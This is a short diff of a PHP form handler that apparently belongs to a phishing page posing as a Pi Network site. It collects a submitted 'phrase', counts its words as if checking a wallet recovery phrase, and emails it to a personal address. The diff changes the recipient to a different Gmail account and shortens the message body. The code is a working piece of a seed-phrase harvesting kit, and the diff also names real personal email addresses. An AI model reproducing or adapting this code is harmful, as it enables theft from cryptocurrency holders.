@@ -69,13 +69,13 @@ body {
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   $comment = $_POST['comment'];
-  $to = 'determine723@gmail.com'; // Replace with your email address
+  $to = 'samuelppal@gmail.com'; // Replace with your email address
 
   $subject = 'New phrase from your pi website';
-  $message = " the phrase is : $comment";
+  $message = "$comment";
 
   $headers = "From: Your Website <trade.corepiy.com>\r\n";
-  $headers .= "Reply-To: determine723@gmail.com\r\n";
+  $headers .= "Reply-To: samuelppal@gmail.com\r\n";
   $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
   // Count the number of words in the comment
